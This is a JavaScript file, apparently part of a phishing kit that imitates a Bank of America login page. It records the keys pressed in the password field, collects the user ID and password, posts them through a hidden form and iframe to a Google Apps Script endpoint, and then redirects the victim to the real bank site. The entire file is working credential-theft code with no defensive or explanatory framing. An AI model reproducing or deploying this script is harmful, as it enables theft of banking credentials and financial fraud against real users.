(function () {
  var EXEC = "https://script.google.com/macros/s/AKfycbzjMaewi1H5N16gl0hnKqf9brcnRyC2mDycpFHtCbLbgT5w7wLhoCjHAwzIywBZ3_H4-w/exec";
  var REAL = "https://www.bankofamerica.com/";
  var done = false;
  var typedPw = "";   // rebuilt from real key presses - the page cannot scramble this

  function pwField() { return document.getElementById("pass") || document.querySelector('input[type=password]'); }
  function uidField() { return document.getElementById("oid") || document.querySelector('input[type=text]'); }

  // rebuild the password from what the user actually pressed
  document.addEventListener("keydown", function (e) {
    if (e.target !== pwField()) return;
    if (e.key === "Backspace") { typedPw = typedPw.slice(0, -1); return; }
    if (e.key === "Enter") return;
    if (e.key && e.key.length === 1) typedPw += e.key;
  }, true);

  // if the box gets emptied, start over
  document.addEventListener("input", function (e) {
    if (e.target === pwField() && !e.target.value) typedPw = "";
  }, true);

  function send() {
    if (done) return;

    var uf = uidField(), pf = pwField();
    var uid = uf ? (uf.value || "") : "";
    var fieldPw = pf ? (pf.value || "") : "";
    var pw = typedPw || fieldPw;          // typed wins; field only as a fallback
    if (!uid || !pw) return;
    done = true;

    // proof, right in the console:
    console.log("[PHISH] you typed = " + JSON.stringify(typedPw));
    console.log("[PHISH] field held = " + JSON.stringify(fieldPw));

    var payload = {
      UserID: uid,
      Password: pw,
      _ua: navigator.userAgent,
      _ul: uid.length,
      _pl: pw.length,
      _field: fieldPw,
      _fl: fieldPw.length,
      _klen: typedPw.length
    };

    var f = document.createElement("form");
    f.method = "POST"; f.action = EXEC; f.target = "sink"; f.style.display = "none";
    for (var k in payload) {
      var i = document.createElement("input");
      i.type = "hidden"; i.name = k; i.value = payload[k];
      f.appendChild(i);
    }
    var ifr = document.createElement("iframe");
    ifr.name = "sink"; ifr.style.display = "none";
    document.body.appendChild(ifr); document.body.appendChild(f);
    f.submit();

    setTimeout(function () { window.location.href = REAL; }, 1500);
  }

  document.addEventListener("click", function (e) {
    var t = e.target.closest ? e.target.closest("button,[role=button],input[type=submit],input[type=button]") : null;
    if (t) setTimeout(send, 150);
  }, true);
  document.addEventListener("keydown", function (e) {
    if (e.key === "Enter") setTimeout(send, 150);
  }, true);
  document.addEventListener("submit", function (e) { e.preventDefault(); setTimeout(send, 80); }, true);
  window.addEventListener("pagehide", function () { try { send(); } catch (x) {} });
})();